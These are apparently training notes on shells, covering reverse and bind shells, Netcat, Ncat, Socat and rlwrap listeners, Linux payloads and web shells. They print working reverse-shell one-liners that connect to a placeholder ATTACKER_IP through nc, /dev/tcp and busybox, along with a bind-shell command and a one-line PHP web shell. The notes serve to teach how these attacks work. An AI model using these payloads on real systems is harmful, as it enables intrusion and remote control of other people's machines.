# Shells – Basics

## What is a Shell?

A **shell** is software that allows a user to interact with an operating system.

It can be:

* A **graphical interface (GUI)**
* A **command-line interface (CLI)**

In cybersecurity, a shell commonly refers to a **shell session that gives access to a system**, allowing commands and software to be executed.

## What Can Shell Access Be Used For?

Once an attacker obtains shell access to a compromised system, they may be able to:

* **Remote System Control** – Execute commands or software on the target system remotely.
* **Privilege Escalation** – Attempt to gain higher-level or administrative privileges.
* **Data Exfiltration** – Find, read, and copy sensitive data from the system.
* **Persistence** – Create accounts, use credentials, or place software to maintain access.
* **Post-Exploitation** – Carry out further activities after gaining access, such as deploying malware or modifying the system.
* **Pivoting** – Use the compromised system as a starting point to access other systems on the network.

## Simple Flow

```text
Gain shell access
      ↓
Run commands
      ↓
Explore the system
      ↓
Privilege escalation / data access / persistence
      ↓
Further post-exploitation
      ↓
Potentially pivot to other systems
```

## Key Point

A shell provides a way to **interact with and control an operating system through commands**.

In cybersecurity, obtaining a shell can be an important stage of an attack because it provides access to the target system and enables further actions.

# Reverse Shell – Basics

## What is a Reverse Shell?

A **reverse shell** is a technique where the **target system connects back to the attacker's machine**.

Instead of the attacker directly connecting to the target, the attacker sets up a listener and waits for the target to connect back.

```text
Attacker
   ↑
   │ Reverse shell connection
   │
Target system
```

Once connected, the attacker can interact with the target through a command-line shell.

## Netcat Listener

**Netcat (`nc`)** can be used to listen for an incoming reverse shell connection.

```bash
nc -lvnp 443
```

### Flags

| Flag | Meaning                           |
| ---- | --------------------------------- |
| `-l` | Listen for an incoming connection |
| `-v` | Verbose output                    |
| `-n` | Don't perform DNS lookups         |
| `-p` | Specify the listening port        |

In this example, the listener waits on **port 443**.

### Common Ports

Attackers and penetration testers may use ports commonly associated with legitimate services, such as:

* `53` – DNS
* `80` – HTTP
* `8080` – HTTP/proxy
* `443` – HTTPS
* `139` – NetBIOS
* `445` – SMB

Using commonly used ports can sometimes make malicious traffic less obvious.

## Reverse Shell Payload

A **reverse shell payload** is a command or piece of code executed on the target that causes it to connect back to the attacker's listener.

Example pipe reverse shell:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### How the Example Works

* `rm -f /tmp/f` → Removes an existing pipe.
* `mkfifo /tmp/f` → Creates a named pipe (FIFO).
* `cat /tmp/f` → Reads input from the pipe.
* `sh -i` → Starts an interactive shell.
* `2>&1` → Redirects error output to standard output.
* `nc ATTACKER_IP ATTACKER_PORT` → Connects back to the attacker's listener.
* `>/tmp/f` → Sends output back through the named pipe.

The named pipe allows input and output to flow between the shell and the network connection.

## Reverse Shell Flow

```text
1. Attacker starts Netcat listener
             ↓
2. Target executes reverse shell payload
             ↓
3. Target connects back to attacker
             ↓
4. Attacker receives a shell
             ↓
5. Attacker can execute commands on the target
```

## Key Difference

**Reverse shell:**

> Target → connects → Attacker

**Normal/direct connection:**

> Attacker → connects → Target

The important idea is that **the target initiates the connection back to the attacker**.

# Bind Shell – Basics

## What is a Bind Shell?

A **bind shell** is a shell where the **target system opens a port and listens for an incoming connection**.

When the attacker connects to that port, they receive access to the shell and can execute commands remotely.

```text
Attacker
   │
   │ Connects to target
   ↓
Target system
   │
   └── Listening port → Shell
```

## How It Differs from a Reverse Shell

| Shell type        | Who starts the connection?         |
| ----------------- | ---------------------------------- |
| **Reverse shell** | Target → connects back to attacker |
| **Bind shell**    | Attacker → connects to target      |

### Easy way to remember

> **Reverse = target calls back**
> **Bind = target waits for a connection**

## Setting Up a Bind Shell

Example lab command:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

The important part is:

```bash
nc -l 0.0.0.0 8080
```

* `-l` → listen for connections
* `0.0.0.0` → listen on all network interfaces
* `8080` → listening port

The shell waits for the attacker to connect.

## Connecting to the Bind Shell

The attacker can connect using:

```bash
nc -nv TARGET_IP 8080
```

* `-n` → disables DNS resolution
* `-v` → verbose output
* `TARGET_IP` → IP address of the target
* `8080` → port where the bind shell is listening

After connecting, the attacker receives the shell.

## Ports

Ports **below 1024** generally require elevated privileges to bind to.

Using a port such as **8080** avoids this requirement in the lab example.

## Advantages and Disadvantages

**Useful when:**

* The target cannot make outgoing connections.
* The attacker can connect to the target's listening port.

**Disadvantage:**

* The target must keep a port open and listening, which can make the shell easier to detect.

## Bind Shell Flow

```text
1. Target starts a listener
          ↓
2. Target waits for connection
          ↓
3. Attacker connects to target
          ↓
4. Connection is established
          ↓
5. Attacker receives a shell
          ↓
6. Commands can be executed remotely
```

## Key Point

A **bind shell** means the **target binds a port and waits for the attacker to connect**.

> **Bind shell:** Attacker → Target
> **Reverse shell:** Target → Attacker

# Reverse Shell Listeners – Tools

Netcat (`nc`) is commonly used to listen for incoming reverse shells, but there are other tools that can provide additional features.

## 1. Rlwrap

**Rlwrap** uses the GNU Readline library to improve command-line interaction.

It can be used together with Netcat:

```bash
rlwrap nc -lvnp 443
```

### Why use Rlwrap?

It adds features such as:

* Arrow-key navigation
* Command history
* Better command-line editing

**Easy memory:**

> `rlwrap` = makes a Netcat shell easier to use.

---

## 2. Ncat

**Ncat** is an improved version of Netcat developed as part of the **Nmap** project.

It provides additional features, including **SSL encryption**.

### Basic listener

```bash
ncat -lvnp 4444
```

### SSL listener

```bash
ncat --ssl -lvnp 4444
```

The `--ssl` option enables **SSL encryption** for the connection.

**Easy memory:**

> `ncat` = Netcat with extra features.

---

## 3. Socat

**Socat** is a utility that creates connections between two data sources, such as different hosts.

Example listener:

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

### Important parts

* `-d` → enables verbose output
* `-d -d` → increases the verbosity
* `TCP-LISTEN:443` → creates a TCP listener on port 443
* `STDOUT` → sends incoming data to the terminal

**Easy memory:**

> `socat` = connects two data sources.

---

## Quick Comparison

| Tool                | Main purpose                                           |
| ------------------- | ------------------------------------------------------ |
| **Netcat (`nc`)**   | Basic listener                                         |
| **Rlwrap + Netcat** | Better shell interaction                               |
| **Ncat**            | Netcat with extra features such as SSL                 |
| **Socat**           | Connects data sources and provides flexible networking |

## Key Point

All of these tools can be used to **listen for and interact with incoming connections**, such as reverse shells.

# Shell Payloads – Linux Reverse Shells

## What is a Shell Payload?

A **shell payload** is a command or script that exposes a shell through a network connection.

It can be used for:

* **Reverse shell** → the target connects to the attacker.
* **Bind shell** → the target listens for the attacker to connect.

This section focuses mainly on **Linux reverse shell payloads**.

## Bash Reverse Shells

Bash can create reverse shells using `/dev/tcp`.

A basic example:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

This:

* Starts an interactive Bash shell.
* Connects to the attacker's IP and port.
* Redirects input, output, and errors through the connection.

Bash reverse shells can also use **file descriptors** to handle the network connection.

### Key idea

> Bash can use `/dev/tcp` to create a TCP connection and redirect the shell through it.

---

## PHP Reverse Shells

PHP can create reverse shells using functions that execute commands.

Common functions include:

* `exec()`
* `shell_exec()`
* `system()`
* `passthru()`
* `popen()`

These examples generally:

```text
PHP
 ↓
Create socket connection
 ↓
Connect to attacker
 ↓
Execute shell
 ↓
Send input/output through connection
```

### Key idea

> PHP reverse shells use PHP's command-execution functions together with a network socket.

---

## Python Reverse Shells

Python can create reverse shells using modules such as:

* `socket` → creates the network connection.
* `os` → handles file descriptors and processes.
* `pty` → provides an interactive terminal.
* `subprocess` → starts processes.

A typical Python reverse shell:

```text
Python
 ↓
Create socket
 ↓
Connect to attacker
 ↓
Redirect stdin/stdout/stderr
 ↓
Spawn Bash
```

### Key idea

> Python reverse shells use `socket` to connect and redirect the shell's input/output through the connection.

---

## Other Reverse Shell Methods

Linux systems may also have other utilities capable of creating reverse shells.

### Telnet

Can be combined with a named pipe (`mkfifo`) to create a reverse shell.

### AWK

AWK has built-in networking capabilities that can be used to create a TCP connection and execute commands.

### BusyBox

BusyBox may include a Netcat implementation:

```bash
busybox nc ATTACKER_IP 443 -e sh
```

This connects to the attacker and exposes a shell.

---

## Important Concepts

### File Descriptors

Linux uses file descriptors to represent input/output streams:

| Number | Stream          |
| ------ | --------------- |
| `0`    | Standard input  |
| `1`    | Standard output |
| `2`    | Standard error  |

Reverse shells commonly redirect these streams through a network connection.

### `/dev/tcp`

Bash can use `/dev/tcp/HOST/PORT` to create a TCP connection.

### `pty`

Python's `pty` module can provide a more interactive terminal.

### `mkfifo`

`mkfifo` creates a **named pipe (FIFO)** that can be used to pass data between processes.

## Easy Memory

> **Bash** → `/dev/tcp`
> **PHP** → `exec`, `system`, `shell_exec`, etc.
> **Python** → `socket`, `os`, `pty`
> **Telnet / AWK / BusyBox** → alternative methods

## Overall Reverse Shell Flow

```text
Target executes payload
        ↓
Payload creates network connection
        ↓
Target connects to attacker
        ↓
Shell input/output is redirected
        ↓
Attacker receives an interactive shell
```

**Key point:** The exact payload depends on the **operating system, available tools, programming language, and restrictions on the target system**.

# Web Shells – Basics

## What is a Web Shell?

A **web shell** is a script placed on a compromised web server that allows commands to be executed through the web server.

It is usually a file containing code that can:

* Execute system commands
* Access or manage files
* Interact with the compromised server

Web shells can be hidden inside a compromised web application, making them difficult to detect.

## Common Web Shell Languages

Web shells can be written in languages supported by the web server, including:

* **PHP**
* **ASP**
* **JSP**
* **CGI scripts**

## Example PHP Web Shell

A simple PHP web shell can use the `system()` function to execute a command supplied through a URL parameter.

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

The `$_GET['cmd']` part retrieves the command from the URL.

For example:

```text
shell.php?cmd=whoami
```

The server would execute:

```text
whoami
```

and return the result through the web page.

## How a Web Shell Works

```text
Attacker
   ↓
Compromises web server
   ↓
Web shell is placed on server
   ↓
Attacker sends HTTP request
   ↓
Web shell executes command
   ↓
Result is returned through web server
```

## How Web Shells Can Be Deployed

An attacker may place a web shell on a server by exploiting vulnerabilities such as:

* **Unrestricted File Upload**
* **File Inclusion**
* **Command Injection**
* Other forms of unauthorised access

## Examples of Web Shells

### p0wny-shell

A minimal single-file **PHP web shell** that supports remote command execution.

### b374k

A more feature-rich **PHP web shell** with functionality such as:

* Command execution
* File management

### c99 shell

A well-known PHP web shell with extensive functionality, including:

* Command execution
* File manipulation

## Key Difference

A **reverse shell** normally creates a network connection from the target back to the attacker.

A **web shell** uses the **web server itself** to receive requests and execute commands.

### Easy Memory

> **Web shell = commands through a compromised web server**

The key idea is that the attacker interacts with the shell through **web requests**, rather than directly connecting to a command-line shell.
